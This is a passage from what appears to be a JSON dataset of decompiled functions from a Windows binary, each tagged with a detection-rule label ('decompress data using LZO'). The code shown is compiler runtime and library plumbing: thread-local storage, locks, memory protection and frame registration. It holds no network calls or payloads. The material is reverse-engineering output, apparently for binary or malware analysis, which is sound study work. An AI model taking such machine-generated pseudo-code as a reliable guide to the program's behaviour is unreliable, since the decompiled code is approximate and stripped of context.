} while (iVar4 != *0x56b3c0);\n    do {\n        iStack68 = fcn.00437c70();\n        if (iStack68 == 0) {\ncode_r0x004374b7:\n            uVar2 = fcn.004c5640();\n            if (*0x56b3bc == 0) {\n                *0x56b3bc = 1;\n                uStack76 = in_EAX;\n                fcn.00437ce0();\n                iVar4 = fcn.00437ed0();\n                *0x56b3c0 = 0;\n                *0x56b3c4 = &stack0xffffff97 + -iVar4 & 0xfffffff0;\n                uVar2 = 0;\n            }\n            return uVar2;\n        }\n        in_EAX = iStack72 * 0x14;\n        puVar1 = *0x56b3c4 + in_EAX;\n        puVar1[4] = iStack68;\n        *puVar1 = 0;\n        iVar4 = fcn.00437d70();\n        *(*0x56b3c4 + 0xc + in_EAX) = iVar4 + *(iStack68 + 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n        if (iVar4 == 0) {\n            fcn.004c5640();\n            goto code_r0x004374b7;\n        }\n        uVar2 = uStack20;\n        if (((uStack20 - 0x40 & 0xffffffbf) == 0) || (uVar2 = uStack20 - 4 & 0xfffffffb,  uVar2 == 0)) {\ncode_r0x0043742e:\n            *0x56b3c0 = *0x56b3c0 + 1;\n            return uVar2;\n        }\n        iVar4 = in_EAX + *0x56b3c4;\n        *(iVar4 + 4) = uStack40;\n        *(iVar4 + 8) = uStack28;\n        uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (uVar2 != 0) goto code_r0x0043742e;\n        uStack80 = 0x43747a;\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        in_EAX = fcn.004c5640();\ncode_r0x00437490:\n        iStack72 = 0;\n    } while( true );\n}\n",
        "token_count": 1781
    },
    "004378f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004378f0(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x56b3d8);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x56b3d0; puVar1 != NULL; puVar1 = puVar1[2]) {\n        iVar4 = (*pcVar3)(*puVar1);\n        iVar5 = (*pcVar2)();\n        if ((iVar5 == 0) && (iVar4 != 0)) {\n            (*puVar1[1])(iVar4);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x56b3d8);\n    return;\n}\n",
        "token_count": 212
    },
    "00437a80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00437a80(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (param_2 != 1) {\n        if (param_2 == 0) {\n            if (*0x56b3d4 != 0) {\n                fcn.004378f0();\n            }\n            iVar2 = *0x56b3d0;\n            if (*0x56b3d4 == 1) {\n                while (iVar2 != 0) {\n                    iVar1 = *(iVar2 + 8);\n                    fcn.00446e88(iVar2);\n                    iVar2 = iVar1;\n                }\n                *0x56b3d0 = 0;\n                *0x56b3d4 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x56b3d8);\n            }\n        }\n        else if (param_2 == 2) {\n            fcn.00437350();\n        }\n        else if ((param_2 == 3) && (*0x56b3d4 != 0)) {\n            fcn.004378f0();\n        }\n        return 1;\n    }\n    if (*0x56b3d4 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x56b3d8);\n    }\n    *0x56b3d4 = 1;\n    return 1;\n}\n",
        "token_count": 327
    },
    "00438120": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00438120(int32_t *param_1, code *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    \n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (*param_1 == 0) {\n            LOCK();\n            piVar1 = param_1 + 1;\n            *piVar1 = *piVar1 + 1;\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (*piVar1 == 0) {\n                (*param_2)();\n                *param_1 = 1;\n                return 0;\n            }\n            iVar2 = *param_1;\n            while (iVar2 == 0) {\n                (*pcVar3)(0);\n                iVar2 = *param_1;\n            }\n        }\n        return 0;\n    }\n    return 0x16;\n}\n",
        "token_count": 208
    },
    "00439e90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439e90(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint unaff_retaddr;\n    uint auStack224 [38];\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    \n    puVar4 = in_EAX;\n    for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    in_EAX[0x18] = 0x40000000;\n    in_EAX[0x13] = unaff_retaddr;\n    iVar3 = fcn.00438f10();\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    if (iVar3 == 0) {\n        if (*0x515a34 == 0) {\n            if (*0x56b3f4 == '\\0') {\n                *0x56b3f4 = '\\x04';\n                *0x56b3f6 = 4;\n                *0x56b3f5 = 4;\n                *0x56b3f7 = 4;\n                *0x56b3fa = 4;\n                *0x56b3fb = 4;\n                *0x56b3f9 = 4;\n                *0x56b3f8 = '\\x04';\n                *0x56b3ff = 0xc;\n                *0x56b400 = 0xc;\n                *0x56b401 = 0xc;\n                *0x56b402 = 0xc;\n                *0x56b403 = 0xc;\n                *0x56b404 = 0xc;\n                *0x56b3fd = 4;\n                *0x56b3fc = 4;\n            }\n        }\n        else if (*0x515a38 == 0) {\n            LOCK();\n            *0x515a3c = *0x515a3c + 1;\n            if (*0x515a3c == 0) {\n                *0x56b3f4 = '\\x04';\n                *0x56b3f6 = 4;\n                *0x56b3f5 = 4;\n                *0x56b3f7 = 4;\n                *0x56b3fa = 4;\n                *0x56b3fb = 4;\n                *0x56b3f9 = 4;\n                *0x56b3f8 = '\\x04';\n                *0x56b3ff = 0xc;\n                *0x56b400 = 0xc;\n                *0x56b401 = 0xc;\n                *0x56b402 = 0xc;\n                *0x56b403 = 0xc;\n                *0x56b404 = 0xc;\n                *0x56b3fd = 4;\n                *0x56b3fc = 4;\n                *0x515a38 = 1;\n            }\n            else {\n                do {\n                    (*pcVar2)(0);\n                } while (*0x515a38 == 0);\n            }\n        }\n        if (*0x56b3f8 == '\\x04') {\n            if ((*(in_EAX + 99) & 0x40) != 0) {\n                *(in_EAX + 0x1c) = 0;\n            }\n            uStack60 = 1;\n            in_EAX[4] = auStack224;\n            uStack68 = 4;\n            uStack72 = 0;\n            auStack224[0] = param_2;\n            fcn.00439bb0();\n            in_EAX[0x13] = param_1;\n            return;\n        }\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar2 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x52e0f8, 0x56b01c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 1193
    },
    "0043a080": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043a080(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t in_EAX;\n    uint *puVar4;\n    \n    fcn.00439bb0();\n    iVar2 = *(param_2 + 0xb4);\n    if (*(param_2 + 4 + iVar2 * 8) == 6) {\n        *(in_EAX + 0x4c) = 0;\n        return;\n    }\n    if (iVar2 < 0x12) {\n        puVar4 = *(in_EAX + iVar2 * 4);\n        if (((*(in_EAX + 99) & 0x40) == 0) || (*(in_EAX + 0x6c + iVar2) == '\\0')) {\n            if (*(iVar2 + 0x56b3f4) != '\\x04') goto code_r0x004c56b5;\n            puVar4 = *puVar4;\n        }\n        *(in_EAX + 0x4c) = puVar4;\n        return;\n    }\ncode_r0x004c56b5:\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar2 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar3 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x52e0f8, 0x56b01c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 573
    },
    "0043b3d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043b3d0(uint param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    uint32_t *in_EAX;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint extraout_ECX;\n    uint32_t uVar10;\n    uint *puVar11;\n    int32_t *piVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    bool bVar17;\n    ulong uVar18;\n    uint in_stack_ffffffa8;\n    code *pcStack76;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t uStack40;\n    uint32_t *puStack36;\n    int32_t iStack32;\n    \n    uVar5 = *(in_EAX + 4);\n    if ((uVar5 & 1) != 0) goto code_r0x0043b3e5;\n    uStack60 = in_EAX[4] >> 0xb;\n    if (uStack60 == 0) {\n        piVar12 = in_EAX[3];\n        if ((uVar5 & 2) == 0) {\n            uStack60 = fcn.0043afc0();\n            if (uStack60 != 0xffffffff) goto code_r0x0043b5b6;\ncode_r0x0043b4ab:\n            in_EAX[4] = 0x7f8;\n            in_EAX[3] = 0x52720c;\n        }\n        else if (*piVar12 != 0) {\n            do {\n                iVar6 = fcn.0043afc0();\n                if (iVar6 == -1) goto code_r0x0043b4ab;\n                piVar12 = piVar12 + 1;\n                uStack60 = uStack60 + iVar6;\n            } while (*piVar12 != 0);\ncode_r0x0043b5b6:\n            if ((uStack60 & 0xffe00000) == 0) {\n                in_EAX[4] = in_EAX[4] & 0x7ff | uStack60 << 0xb;\n            }\n            else {\n                in_EAX[4] = in_EAX[4] & 0x7ff;\n            }\n            if (uStack60 != 0) goto code_r0x0043b6e0;\n        }\n    }\n    else {\ncode_r0x0043b6e0:\n        iVar6 = uStack60 * 4 + 8;\n        puStack36 = sub.msvcrt.dll_malloc(iVar6);\n        if (puStack36 != NULL) {\n            puStack36[1] = 0;\n            iStack32 = sub.msvcrt.dll_malloc(iVar6);\n            if (iStack32 != 0) {\n                *(iStack32 + 4) = 0;\n            }\n            piVar12 = in_EAX[3];\n            if ((*(in_EAX + 4) & 2) == 0) {\n                fcn.0043b110();\ncode_r0x0043b752:\n                iVar6 = iStack32;\n                puVar4 = puStack36;\n                if ((puStack36 == NULL) || (puStack36[1] == uStack60)) {\n                    pcStack76 = fcn.0043b350;\n                    if (((*(in_EAX + 4) & 4) == 0) && (pcStack76 = 0x43ae60,  (*(in_EAX + 4) & 0x7f8) == 0)) {\n                        pcStack76 = 0x43aad0;\n                    }\n                    if (iStack32 == 0) {\n                        fcn.0043abb0();\n                    }\n                    else {\n                        uVar16 = puStack36[1];\n                        if (uVar16 == 0) {\n                            iVar13 = 0;\n                            uVar9 = 0;\n                        }\n                        else {\n                            iVar13 = 0x56b408;\n                            puVar1 = puStack36 + 2;\n                            iVar15 = 8;\n                            while( true ) {\n                                *(iVar6 + iVar15) = iVar13;\n                                iVar13 = puVar4 + iVar15;\n                                if (uVar16 * 4 + 4 == iVar15) break;\n                                while (iVar13 != 0x56b408) {\n                                    in_stack_ffffffa8 = *(puVar4 + iVar15 + 4);\n                                    iVar7 = (*pcStack76)();\n                                    if (-1 < iVar7) goto code_r0x0043b82f;\n                                    iVar7 = iVar6 + (iVar13 - puVar1);\n                                    iVar13 = *(iVar7 + 8);\n                                    *(iVar7 + 8) = 0;\n                                }\n                                iVar13 = 0x56b408;\ncode_r0x0043b82f:\n                                iVar15 = iVar15 + 4;\n                            }\n                            iVar13 = 0;\n                            uVar9 = 0;\n                            uVar14 = 0;\n                            do {\n                                if (*(iVar6 + 8 + uVar14 * 4) == 0) {\n                                    *(iVar6 + 8 + iVar13 * 4) = puVar4[uVar14 + 2];\n                                    iVar13 = iVar13 + 1;\n                                }\n                                else {\n                                    puVar4[uVar9 + 2] = puVar4[uVar14 + 2];\n                                    uVar9 = uVar9 + 1;\n                                }\n                                uVar14 = uVar14 + 1;\n                            } while (uVar16 != uVar14);\n                        }\n                        puVar4[1] = uVar9;\n                        *(iVar6 + 4) = iVar13;\n                        if (*(iStack32 + 4) + puStack36[1] != uStack60) goto code_r0x0043ba45;\n                        fcn.0043abb0();\n                        iVar6 = iStack32;\n                        puVar4 = puStack36;\n                        uStack60 = *(iStack32 + 4);\n                        if (uStack60 != 0) {\n                            uVar16 = puStack36[1];\n                            do {\n                                iVar13 = uStack60 + -1;\n                                puVar1 = iVar6 + uStack60 * 4;\n                                uStack68 = puVar1[1];\n                                if (uVar16 == 0) {\n                                    puVar4[uStack60 + 1] = uStack68;\n                                    if (uStack60 == 1) break;\n                                    uStack68 = *puVar1;\n                                    iVar15 = uStack60 + -2;\n                                    uStack60 = uStack60 + -2;\n                                }\n                                else {\n                                    iVar7 = uStack60 + -1 + uVar16;\n                                    do {\n                                        uVar9 = uVar16 - 1;\n                                        iVar8 = (*pcStack76)(in_EAX, puVar4[uVar16 + 1], uStack68);\n                                        iVar15 = iVar7;\n                                        uStack60 = iVar13;\n                                        if (iVar8 < 1) break;\n                                        puVar4[iVar7 + 2] = puVar4[uVar16 + 1];\n                                        iVar7 = iVar7 + -1;\n                                        iVar15 = iVar13;\n                                        uVar16 = uVar9;\n                                    } while (uVar9 != 0);\n                                }\n                                puVar4[iVar15 + 2] = uStack68;\n                            } while (uStack60 != 0);\n                            puVar4[1] = puVar4[1] + *(iVar6 + 4);\n                        }\n                        fcn.00446e88(iStack32);\n                    }\n                    *puStack36 = in_EAX[3];\n                    in_EAX[3] = puStack36;\n                    *(in_EAX + 4) = *(in_EAX + 4) | 1;\n                    goto code_r0x0043b5d7;\n                }\n            }\n            else if (*piVar12 != 0) {\n                do {\n                    piVar12 = piVar12 + 1;\n                    fcn.0043b110();\n                } while (*piVar12 != 0);\n                goto code_r0x0043b752;\n            }\ncode_r0x0043ba45:\n            uVar18 = sub.msvcrt.dll_abort();\n            puVar11 = uVar18 >> 0x20;\n            *puVar11 = 0xffffffff;\n            puVar11[1] = extraout_ECX;\n            puVar11[3] = uVar18;\n            iVar6 = *0x515a34;\n            puVar11[2] = in_stack_ffffffa8;\n            puVar11[4] = 0x7f8;\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (iVar6 == 0) {\ncode_r0x0043bb16:\n                iVar6 = *0x56b418;\n                puVar11[5] = *0x56b418;\n                *0x56b418 = puVar11;\n            }\n            else {\n                if (*0x515a40 == 0) {\n                    LOCK();\n                    *0x515a44 = *0x515a44 + 1;\n                    if (*0x515a44 == 0) {\n                        fcn.0043ac50();\n                        *0x515a40 = 1;\n                    }\n                    else {\n                        do {\n                            (*pcVar3)(0);\n                        } while (*0x515a40 == 0);\n                    }\n                    if (*0x515a34 == 0) goto code_r0x0043bb16;\n                }\n                LOCK();\n                iVar6 = *0x56b40c + 1;\n                bVar17 = *0x56b40c != -1;\n                *0x56b40c = iVar6;\n                if ((bVar17) &&\n                   (iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x56b410, 0xffffffff),  iVar6 != 0)) {\n                    LOCK();\n                    *0x56b40c = *0x56b40c + -1;\n                }\n                iVar6 = *0x56b418;\n                iVar13 = *0x515a34;\n                puVar11[5] = *0x56b418;\n                *0x56b418 = puVar11;\n                if (iVar13 != 0) {\n                    LOCK();\n                    iVar13 = *0x56b40c + -1;\n                    iVar6 = *0x56b40c + -1;\n                    *0x56b40c = iVar13;\n                    if (-1 < iVar6) {\n                        iVar6 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x56b410, 1, 0);\n                    }\n                }\n            }\n            return iVar6;\n        }\n    }\ncode_r0x0043b5d7:\n    if (param_2 <= *in_EAX && *in_EAX != param_2) {\n        return 0;\n    }\n    uVar5 = *(in_EAX + 4);\n    piVar12 = in_EAX[3];\n    if ((uVar5 & 1) == 0) {\n        if ((uVar5 & 2) == 0) {\n            iVar6 = fcn.0043b220();\n            return iVar6;\n        }\n        iVar6 = *piVar12;\n        while( true ) {\n            if (iVar6 == 0) {\n                return 0;\n            }\n            iVar6 = fcn.0043b220();\n            if (iVar6 != 0) break;\n            piVar12 = piVar12 + 1;\n            iVar6 = *piVar12;\n        }\n        return iVar6;\n    }\ncode_r0x0043b3e5:\n    uVar16 = in_EAX[3];\n    uStack68 = *(uVar16 + 4);\n    if ((uVar5 & 4) == 0) {\n        uVar9 = 0;\n        if ((*(in_EAX + 4) & 0x7f8) == 0) {\n            while (uVar9 < uStack68) {\n                uVar10 = uVar9 + uStack68 >> 1;\n                iVar6 = *(uVar16 + 8 + uVar10 * 4);\n                iVar13 = *(iVar6 + 0xc);\n                uVar14 = *(iVar6 + 8);\n                while (uVar2 = uVar10,  param_2 < uVar14) {\n                    if (uVar2 <= uVar9) {\n                        return 0;\n                    }\n                    uVar10 = uVar2 + uVar9 >> 1;\n                    iVar6 = *(uVar16 + 8 + uVar10 * 4);\n                    iVar13 = *(iVar6 + 0xc);\n                    uStack68 = uVar2;\n                    uVar14 = *(iVar6 + 8);\n                }\n                if (param_2 < uVar14 + iVar13) {\n                    return iVar6;\n                }\n                uVar9 = uVar2 + 1;\n            }\n        }\n        else {\n            fcn.0043ace0();\n            if (uStack68 != 0) {\n                uVar9 = 0;\n                do {\n                    uVar14 = uStack68 + uVar9 >> 1;\n                    iVar6 = *(uVar16 + 8 + uVar14 * 4);\n                    fcn.0043ad20(&uStack40);\n                    fcn.0043ad20(&puStack36);\n                    if (uStack40 <= param_2) {\n                        if (param_2 < uStack40 + puStack36) {\n                            return iVar6;\n                        }\n                        uVar9 = uVar14 + 1;\n                        uVar14 = uStack68;\n                    }\n                    uStack68 = uVar14;\n                } while (uVar9 < uVar14);\n            }\n        }\n    }\n    else if (uStack68 != 0) {\n        uStack64 = 0;\n        do {\n            uVar9 = uStack68 + uStack64 >> 1;\n            iVar6 = *(uVar16 + 8 + uVar9 * 4);\n            fcn.0043aed0();\n            fcn.0043ace0();\n            fcn.0043ad20(&uStack40);\n            fcn.0043ad20(&puStack36);\n            if (uStack40 <= param_2) {\n                if (param_2 < uStack40 + puStack36) {\n                    return iVar6;\n                }\n                uStack64 = uVar9 + 1;\n                uVar9 = uStack68;\n            }\n            uStack68 = uVar9;\n        } while (uStack64 < uStack68);\n    }\n    return 0;\n}\n",
        "token_count": 3326
    },
    "0043c050": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.0043c050(uint32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t auStack32 [4];\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n    if (*0x515a34 != 0) {\n        if (*0x515a40 == 0) {\n            LOCK();\n            *0x515a44 = *0x515a44 + 1;\n            if (*0x515a44 == 0) {\n                fcn.0043ac50();\n                *0x515a40 = 1;\n            }\n            else {\n                do {\n                    (*pcVar3)(0);\n                } while (*0x515a40 == 0);\n            }\n            if (*0x515a34 == 0) goto code_r0x0043c083;\n        }\n        LOCK();\n        *0x56b40c = *0x56b40c + 1;\n        if ((*0x56b40c != 0) &&\n           (iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x56b410, 0xffffffff),  iVar5 != 0)) {\n            LOCK();\n            *0x56b40c = *0x56b40c + -1;\n        }\n    }\ncode_r0x0043c083:\n    if (*0x56b414 == NULL) goto code_r0x0043c0b0;\n    puVar7 = *0x56b414;\n    if (param_1 < **0x56b414) {\n        do {\n            puVar7 = puVar7[5];\n            if (puVar7 == NULL) goto code_r0x0043c0b0;\n        } while (param_1 <= *puVar7 && *puVar7 != param_1);\n    }\n    iVar5 = fcn.0043b3d0();\n    iVar6 = *0x56b40c;\n    do {\n        while( true ) {\n            *0x56b40c = iVar6;\n            if (iVar5 != 0) {\n                if (*0x515a34 != 0) {\n                    LOCK();\n                    *0x56b40c = iVar6 + -1;\n                    if (-1 < iVar6 + -1) {\n                        (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x56b410, 1, 0);\n                    }\n                }\n                *param_2 = puVar7[1];\n                param_2[1] = puVar7[2];\n                if ((*(puVar7 + 4) & 4) != 0) {\n                    fcn.0043aed0();\n                }\n                fcn.0043ace0();\n                fcn.0043ad20(auStack32);\n                param_2[2] = auStack32[0];\n                return iVar5;\n            }\ncode_r0x0043c0b0:\n            puVar7 = *0x56b418;\n            if (*0x56b418 == NULL) {\n                if (*0x515a34 != 0) {\n                    LOCK();\n                    iVar5 = *0x56b40c + -1;\n                    iVar6 = *0x56b40c + -1;\n                    *0x56b40c = iVar5;\n                    if (-1 < iVar6) {\n                        (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x56b410, 1, 0);\n                    }\n                }\n                return 0;\n            }\n            *0x56b418 = (*0x56b418)[5];\n            iVar5 = fcn.0043b3d0();\n            if ((*0x56b414 != NULL) &&\n               (uVar2 = *puVar7,  puVar4 = *0x56b414,  uVar2 < **0x56b414 || uVar2 == **0x56b414)) break;\n            puVar7[5] = *0x56b414;\n            iVar6 = *0x56b40c;\n            *0x56b414 = puVar7;\n        }\n        do {\n            ppuVar1 = puVar4 + 5;\n            puVar4 = puVar4[5];\n            if (puVar4 == NULL) break;\n        } while (uVar2 <= *puVar4);\n        puVar7[5] = puVar4;\n        *ppuVar1 = puVar7;\n        iVar6 = *0x56b40c;\n    } while( true );\n}\n",
        "token_count": 1063
    },
    "0043c420": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0043c420(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    if (*0x515a34 == 0) {\n        if (*(param_1 + 8) != 0) {\n            return;\n        }\n        uVar6 = fcn.0043c300();\n        *(param_1 + 8) = uVar6;\n        return;\n    }\n    uVar10 = *(param_1 + 8);\n    if (uVar10 == 0) {\n        if (*0x515a34 == 0) {\ncode_r0x0043c5f8:\n            uVar10 = *(param_1 + 8);\n            if (uVar10 == 0) goto code_r0x0043c607;\n        }\n        else {\n            if (*0x515a48 == 0) {\n                LOCK();\n                *0x515a4c = *0x515a4c + 1;\n                if (*0x515a4c == 0) {\n                    fcn.0043c3a0();\n                    *0x515a48 = 1;\n                }\n                else {\n                    do {\n                        (*pcVar2)(0);\n                    } while (*0x515a48 == 0);\n                }\n                if (*0x515a34 == 0) goto code_r0x0043c5f8;\n            }\n            LOCK();\n            *0x56b424 = *0x56b424 + 1;\n            if ((*0x56b424 != 0) &&\n               (iVar8 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x56b428, 0xffffffff),  iVar8 != 0)) {\n                LOCK();\n                *0x56b424 = *0x56b424 + -1;\n            }\n            uVar10 = *(param_1 + 8);\n            if (uVar10 == 0) {\ncode_r0x0043c607:\n                uVar10 = *0x56b41c + 1;\n                *0x56b41c = uVar10;\n                *(param_1 + 8) = uVar10;\n            }\n            if (*0x515a34 != 0) {\n                LOCK();\n                iVar8 = *0x56b424 + -1;\n                iVar7 = *0x56b424 + -1;\n                *0x56b424 = iVar8;\n                if (-1 < iVar7) {\n                    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x56b428, 1, 0);\n                }\n            }\n        }\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar6 = *0x56b420;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    puVar4 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar6);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n    if (puVar4 == NULL) {\n        puVar4 = sub.msvcrt.dll_calloc(uVar10 + 0x21, 4);\n        if (puVar4 == NULL) {\ncode_r0x004014e0:\n            sub.msvcrt.dll_abort();\n            iVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar8 == 0) {\n                *0x4ce004 = 0x43c000;\n                pcVar2 = 0x43bdb0;\n            }\n            else {\n                *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar8, \"__register_frame_info\");\n                *0x4ce004 = (*pcVar1)(iVar8, \"__deregister_frame_info\");\n            }\n            if (pcVar2 != NULL) {\n                (*pcVar2)(0x52e0f8, 0x56b01c);\n            }\n            fcn.004014c0(fcn.00401590);\n            return;\n        }\n        *puVar4 = uVar10 + 0x20;\n    }\n    else {\n        uVar5 = *puVar4;\n        if (uVar10 <= uVar5) goto code_r0x0043c487;\n        uVar9 = uVar5 * 2;\n        if (uVar5 * 2 < uVar10) {\n            uVar9 = uVar10 + 0x20;\n        }\n        puVar4 = sub.msvcrt.dll_realloc(puVar4, uVar9 * 4 + 4);\n        if (puVar4 == NULL) goto code_r0x004014e0;\n        *puVar4 = uVar9;\n        sub.msvcrt.dll_memset(puVar4 + uVar5 + 1, 0, (uVar9 - uVar5) * 4);\n    }\n    iVar8 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x56b420, puVar4);\n    if (iVar8 == 0) {\n        (*pcVar2)();\n    }\ncode_r0x0043c487:\n    if (puVar4[uVar10] == 0) {\n        uVar5 = fcn.0043c300();\n        puVar4[uVar10] = uVar5;\n    }\n    return;\n}\n",
        "token_count": 1299
    },
    "00440430": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00440430(int16_t *param_1, int16_t *param_2)\n\n{\n    uint16_t uVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    \n    *param_2 = param_1[5] >> 0xf;\n    uVar1 = param_1[5];\n    param_2[1] = uVar1 & 0x7fff;\n    if ((uVar1 & 0x7fff) != 0x7fff) {\n        param_2[2] = 0;\n        piVar3 = param_1 + 4;\n        piVar4 = param_2 + 3;\n        do {\n            piVar2 = piVar3 + -1;\n            *piVar4 = *piVar3;\n            piVar3 = piVar2;\n            piVar4 = piVar4 + 1;\n        } while (piVar2 != param_1 + -1);\n        param_2[8] = 0;\n        return;\n    }\n    if ((param_1[5] & 0x7fffU) == 0x7fff) {\n        piVar3 = param_1;\n        do {\n            piVar4 = piVar3 + 1;\n            if (*piVar3 != 0) {\n                param_2[2] = 0;\n                piVar3 = param_1 + 4;\n                piVar4 = param_2 + 3;\n                do {\n                    piVar2 = piVar3 + -1;\n                    *piVar4 = *piVar3;\n                    piVar3 = piVar2;\n                    piVar4 = piVar4 + 